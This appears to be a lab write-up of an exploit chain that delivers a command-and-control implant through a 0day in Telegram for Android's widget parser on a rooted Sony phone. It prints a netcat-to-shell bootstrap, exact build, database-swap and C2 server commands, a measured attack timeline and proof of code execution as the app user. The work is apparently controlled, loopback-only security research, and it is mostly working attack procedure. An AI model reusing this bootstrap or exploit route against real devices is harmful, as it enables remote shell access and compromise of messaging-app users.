# C2 delivery on the universal c2560s final: Telegram 13.2.2 (72929)

Date: 2026-11-07.  Device: Sony XQ-BT52, Android 13, Telegram beta 72929,
app UID 10346 (`u0_a346`).  Host-only work: no device operation was performed
for this note; the orchestrator runs the device.

## What this is

The universal c2560s final (`device/widget/c2560_final_c2560s_72929.html`,
9,946 raw / 4,023 zlib9, A/B/C = 2,228/7,182/408, device-proven 5/5 at
B=7,182 with proof 185 / `uid=10346`) carries a 50-byte `system()` command
field.  The C2 variant replaces only that field with the 44-char loopback
bootstrap and keeps the widget geometry probe-SAFE:

`device/widget/c2560_final_c2560s_c2_72929.html`
= 9,946 raw / **4,025 zlib9**, A/B/C = 2,228/7,182/408,
md5 `5f4fdaed215ed09b261920186a39e3eb`.

* Stage A and stage C are byte-identical to the device-proven final.
* Stage B differs only in the 50-byte command literal (44-char bootstrap +
  6 trailing spaces); the stage-B script length stays exactly 7,182, so the
  `S1 SAFE2560C` probe at B=7,182 (72929, 19:20) still applies.
* Host twin for host validation: `c2560_final_c2560s_c2_host.html`
  (same A/C, exact 44-char literal, B=7,182 by trimming 5 bytes of the
  trailing comment).  The **device** endgame stops at `HF ERR NOANCHOR` on
  the host by design.

Builder: `device/gen_c2_widget.py` (asserts A/C identical, B length 7,182,
literal width preserved, `sh -n`, raw <=32,768, zlib9 <=4,096).

## Bootstrap (44 chars, fits the 50-byte field)

```
setsid sh -c 'sleep 5|nc 127.0.0.1 5555|sh'&
```

* `setsid ... &`: `system()` returns in ~1 ms on the host (`sh -c '<cmd>'`
  measurement); the detached pipeline keeps running.  Same form device-proven
  on 2026-11-02 (loader served 39,348 B, `exec id` -> `untrusted_app`).
* `sleep 5`: toybox applet; holds toybox `nc` stdin open so it does not exit
  on pipe EOF before the ~39 KB bootstrap is written.  The proven gate was
  2-3 s; 5 s is margin.
* `nc 127.0.0.1 5555`: `/system/bin/nc` is a toybox symlink (verified on the
  Sony), PATH includes `/system/bin`; no `/system/bin/toybox` prefix needed.
* `| sh`: mksh runs the bootstrap served on the loader port.

Toybox compatibility: Android-13 applet audit in `c2/README.md` §4
(`nc`, `sleep`, `setsid`, `sh` present), the 2026-11-02 device proofs, and a
host applet-dispatch proxy (busybox symlinks on PATH) in
`c2/run_local_test.sh` phase 7.  Note: the `toybox nc` absolute form is 51
bytes even with the shortest sleep, so it does not fit the 50-byte field -
the bare `nc` symlink (user-verified on the Sony) is load-bearing.  If it
fails on-device, this widget cannot carry the C2 command; the #1865 loader
(larger command buffer) is the fallback.

## Host evidence (this revision)

* `c2/run_local_test.sh`: **91/91 PASS** (was 74).  Phase 7 checks the exact
  44-char form, <=50 bytes, PATH-only applets, `sh -n`, `system()` returns in
  <2 s, the loader fetch, hello, `exec echo`, `exec id`, clean stop, and the
  busybox applet-symlink proxy.
* `c2/run_widget_e2e.sh`: **11/11 PASS**.  Runs the host-twin C2 widget
  through the app-like sibling-script harness (8 MiB limit): stage A
  `RESULT ABLEN[599]=327744 VLEN=327744`, stage B `HF OK`, teardown
  `system(bootstrap)`, loader serves ~39.8 KB, mock implant
  `hello implant=tg-10123-Mock-Device ... from=127.0.0.1`, `exec id`, `bye
  stop`.  Work dir `/tmp/opencode/c2_widget_e2e_release`; session log
  `logs/run-20261107-195430/`.
* No bot, no tunnel, no outbound network: loopback listeners only.  The
  server refuses non-private binds/peers.

## Device run (orchestrator)

> Executed on 2026-11-08 15:00 on the Sony; the measured timeline and proof
> are in **"Measured device run; 2026-11-08 15:00"** below.

Exact command block: `c2/README.md` §5.0.1.  Summary:

1. `python3 c2/server/c2_server.py --host 127.0.0.1 --port 4444
   --loader-port 5555 --bootstrap nc --token <TOKEN> --wait-session 180
   --cmd sessions --cmd "exec id" ...`
2. `adb reverse tcp:4444 tcp:4444` and `adb reverse tcp:5555 tcp:5555`.
3. Build `/tmp/opencode/c2_72929.db` from the base, delete the old row 80345,
   `build_db.py ... c2560_final_c2560s_c2_72929.html` (raw 9,946 / zlib 4,025
   / blob 4,100), push + root swap, chown 10346, chcon the app file context,
   remove `files/n1`.
4. Open `tg://openmessage?user_id=<CHAT_ID>&message_id=80345`.

Acceptance: one `hello` with `uid=10346 user=u0_a346 device=XQ-BT52
from=127.0.0.1`, `exec id` = `uid=10346(u0_a346) ... untrusted_app`, and the
loader served ~39.8 KB.  Extra `loader: serving` lines are the
`mf.js_free = system` hook firing again (the bootstrap answers
`C2_ALREADY_RUNNING`).

If stage C shows `END=HF OK` but no `loader: serving`, the command did not
run (check logcat for the widget payload 4,025 -> 9,946 and the stage-C
marker).  If the loader serves but no hello arrives, read
`files/.c2/implant.log` / `sup.out` and verify both reverse ports.

---

## Measured device run: 2026-11-08 15:00 (Sony XQ-BT52, 72929)

**Result: open → C2 hello = 1.913 s** (1.960 s measured from the host
`am start` command; the device clock is 53 ± 10 ms behind the host, so the
honest number is **≈1.91-1.96 s**).  One open, one success: **1/1, no
NOCORR**, no retry.

This is the first measured end-to-end latency for the parser 0day C2 route
on the Sony.  The delivery was the DB/root path of §5.0.1, not a bot
`sendWidget`: at 14:55:18-14:55:26 the bot chat `<CHAT_ID>` was concurrently
receiving and deleting another test's widget messages (logcat messages
80549/80550), and the C2 artifact is 4,025 B zlib against the Bot API
4,096 B cap.  The DB row is
local to the Sony and does not create a server-side message that other
logged-in devices could render.  The open→hello interval is independent of
the delivery method: the widget runs only when the chat is opened.

The live `cache4.db` was pulled first (main + 4.2 MB WAL); the copy reported
the same pre-existing `task_idx_messages_v2` integrity warnings as the
documented base, so the run used the base and let the app re-sync server
messages on start (it fetched message 80484 during the 10 s warm-up).  All
traffic was loopback: `adb reverse` + `127.0.0.1:4444/5555`; no tunnel and
no outbound connection from the C2 server.

### Exact run

```sh
RUN=/tmp/opencode/c2_measure/run_20261108_145842
cd <HOME>/ailocal/Telegram/telegramandroidwidget

# 1) DB (base DB of the runbook: never the live file)
cp lab/qjs_n1/db/final_base_20261107.db $RUN/c2_install.db
sqlite3 $RUN/c2_install.db "DELETE FROM messages_v2 WHERE mid=80345 AND uid=<CHAT_ID>;"
python3 lab/qjs_n1/db/build_db.py $RUN/c2_install.db \
  lab/qjs_fork_audit/zeroday_hunt_parser/device/widget/c2560_final_c2560s_c2_72929.html
# -> raw 9946 zlib 4025 blob 4100: row (80345,<CHAT_ID>,4100)

# 2) swap (app force-stopped: document context re-applied)
adb -s <SERIAL> push $RUN/c2_install.db /sdcard/c2_install.db
adb -s <SERIAL> shell 'su -c "am force-stop org.telegram.messenger.beta; \
  cat /sdcard/c2_install.db > /data/user/0/org.telegram.messenger.beta/files/cache4.db \
  && rm -f .../cache4.db-wal .../cache4.db-shm \
  && chown 10346:10346 .../cache4.db && chmod 600 .../cache4.db \
  && chcon u:object_r:app_data_file:s0:c90,c257,c512,c768 .../cache4.db \
  && rm -f .../files/n1 && rm -rf .../files/.c2"'

# 3) loopback reverse
adb -s <SERIAL> reverse tcp:4444 tcp:4444
adb -s <SERIAL> reverse tcp:5555 tcp:5555

# 4) C2 server (stdout stamped with host epoch ms by stamp.py)
python3 -u c2/server/c2_server.py --host 127.0.0.1 --port 4444 \
  --loader-port 5555 --bootstrap nc --token s0ny72929c2 \
  --log-dir $RUN/logs --download-dir $RUN/dl --wait-session 180 \
  --cmd sessions --cmd "exec id" \
  --cmd "exec getprop ro.build.version.release" \
  --cmd "exec getprop ro.product.model" --cmd "pause 3" \
  --cmd "bye stop" --cmd quit

# 5) warm app, then measured open (ftrace markers + logcat + server ms)
adb -s <SERIAL> shell am start -n org.telegram.messenger.beta/org.telegram.ui.LaunchActivity
sleep 10
adb -s <SERIAL> shell 'su -c "sh /data/local/tmp/trace_start.sh"'
adb -s <SERIAL> shell 'su -c "sh /data/local/tmp/open_chat.sh"'
# open_chat.sh:
#   echo "OPEN_BEFORE $(date +%s%3N)" > /sys/kernel/tracing/trace_marker
#   am start -n org.telegram.messenger.beta/org.telegram.ui.LaunchActivity \
#     -a android.intent.action.VIEW \
#     -d 'tg://openmessage?user_id=<CHAT_ID>&message_id=80345'
#   echo "OPEN_AFTER $(date +%s%3N)" > /sys/kernel/tracing/trace_marker
```

The phone's ftrace (`sched_switch`, `sched_process_fork`,
`sched_process_exit`; filter `widget.sandbox|sh|nc`) plus the host-stamped
server log give sub-ms device-side boundaries.  Trace clock ↔ wall clock
uses the `TRACE_ON`/`OPEN_BEFORE`/`OPEN_AFTER` `trace_marker` writes
(spread 2.2 ms).  Device clock ↔ host clock uses ten paired `date +%s%3N`
samples taken at 15:01:18: device = host − 53 ms (bracket 18-23 ms).

### Timeline (host clock)

| t | Δ from open | event | source |
|---|---|---|---|
| 15:00:06.557 | −47 ms | `am start` command issued | host shell |
| 15:00:06.604 | **0** | ActivityTaskManager `START ... tg://openmessage?user_id=<CHAT_ID>&message_id=80345` | logcat 06.551 |
| 15:00:06.624 | +20 ms | `present fragment ... {message_id=80345}` (chat open) | logcat 06.571 |
| 15:00:07.062 | +459 ms | C2 widget sandbox task thread (tid 4542) first run | ftrace 83452.338446 |
| 15:00:07.401 | +797 ms | **first `system()` fork** from the widget thread (4542 → sh) | ftrace 83452.677319 |
| 15:00:07.447 | +843 ms | first `sh` child fork (pipeline start) | ftrace 83452.722935 |
| 15:00:07.501 | +897 ms | loader accepts the first bootstrap, serves **39,787 B** | server ms log |
| 15:00:08.517 | **+1,913 ms** | **session 1 hello** (`tg-10346-XQ-BT52`) | server ms log |
| 15:00:09.767 | +3,163 ms | `exec id` stdout | server ms log |

Breakdown (measured unless marked):

* open → widget sandbox task start: **459 ms** (chat scroll/view inflation +
  sandbox startup).
* sandbox task start → first `system()`: **339 ms**: this is the stage A +
  stage B + runtime-teardown window.  The exact `RESULT ABLEN[599]=327744`
  and `HF OK` instants are **not** in logcat on 72929 (see below), so this
  window is the measured exploit boundary, not a per-stage split.
* `system()` → loader accept: **100 ms** (shell startup + `nc` connect).
* loader accept → hello: **1,016 ms** (bootstrap + implant start + TCP +
  hello).
* hello → `exec id` output: **1,250 ms**.

Measured vs estimated:

* **Measured**: all rows in the table; the `system()` fork is the first fork
  from the C2 widget's sandbox thread; only 80345 in chat <CHAT_ID> carries
  the `127.0.0.1:5555` bootstrap (the other two `setsid` widgets in the DB
  target `<LAN_IP>:4445` and are in other dialogs; message 80484's
  `1204647382` hash is the benign `N1IOS_FETCH` payload, no `setsid`).
* **Not measured**: the stage-A/B marker instants.  72929 (release build)
  does not write JS exceptions/console to logcat: `grep -E
  'ABLEN|NOCORR|HF OK|RESULT' logcat_run.txt` = 0 matches; the markers exist
  only in the widget's `#v` div.  The `widget height
  0/<CHAT_ID>/<CHAT_ID>/-1598098138 ... session 1` line at 15:00:08.691
  confirms the C2 message was on screen and its sandbox ran; the hash
  `-1598098138` is exactly the 4,025-byte C2 payload.
* **Estimated**: stage A alone ≈ 300 ms (host `run_sib_plain`: 286-300 ms).
  The sandbox threads consumed 383 ms CPU before the first `system()` fork
  (tid 4533 141.7 ms, 4540 35.1 ms, 4542 206.1 ms), so the endgame portion is
  roughly 80-100 ms (383 − 286..300).  This split is an estimate; the 339 ms
  window above is measured.

### Proof

```
session 1 hello implant=tg-10346-XQ-BT52 uid=10346 user=u0_a346
    device=XQ-BT52 pid= build=0b76aaf09f900cf3 from=127.0.0.1
exec id -> uid=10346(u0_a346) gid=10346(u0_a346)
    groups=10346(u0_a346),3002(net_bt),3003(inet),9997(everybody),
    20346(u0_a346_cache),50346(all_a346)
    context=u:r:untrusted_app:s0:c90,c257,c512,c768
exec getprop ro.build.version.release -> 13
exec getprop ro.product.model -> XQ-BT52
```

Loader: 39,787 bytes.  The device DB row `(80345, <CHAT_ID>, 4100)` is
still present after the run (no server overwrite).  The app process stayed
alive (pid 4170); the screen capture after the run showed a black content
area with the status bar only, and `files/.c2` shows `WELCOME session=1` /
`BYE stop=1`; no implant or supervisor process remained after `bye stop`.

### Evidence

`evidence/c2_sony_c2560s_20261108/`:

* `server_ms.out`; host-ms-stamped server log (loader/hello/exec).
* `c2.log`, `session-1.jsonl`, `history.jsonl`; server run log.
* `trace_excerpt.txt`; ftrace markers, widget.sandbox scheduling, first
  `system()` fork, sh chain.
* `logcat_excerpt.txt`; `START`, `link manager`, `present fragment`,
  `widget height` lines.
* `timeline.txt`; the table above, machine-readable.
* `clock_samples.txt`; host/device clock offset samples.
* `implant.log`; device-side `.c2/implant.log`.
* `widget_sha256.txt`, `build_db.out`, `reverse_list.txt`.
* `trace_start.sh`, `trace_stop.sh`, `open_chat.sh`; exact device scripts.
* `screen_after.png`; post-run capture (black content area).

Full raw captures: `/tmp/opencode/c2_measure/run_20261108_145842/`
(`trace_final.txt` 1.19 MB, `logcat_run.txt`, `c2_install.db`).  The
post-run screen capture is `evidence/c2_sony_c2560s_20261108/screen_after.png`
(black content area; status bar only).

### Caveats

* The chat also contained the server-side widget message 80484 (benign
  `N1IOS_FETCH`); it was on screen at 07.159 and may account for the first
  `widget.sandbox` scheduling at 06.935.  The C2 attribution uses the
  `system()` fork and the unique `127.0.0.1:5555` command; the 459 ms
  open→sandbox-task figure is for tid 4542, the thread that forks the C2
  command.
* Host/device wall-clock offset is measured once after the run; a ±10 ms
  drift would move every host-converted device row by that amount.  The
  trace-relative deltas (459/339/100 ms) are immune to it.
* One open, one success.  The 1/1 rate says nothing about NOCORR frequency;
  the earlier 5/5 device proof was at B=7,182 with the same stage A/C.
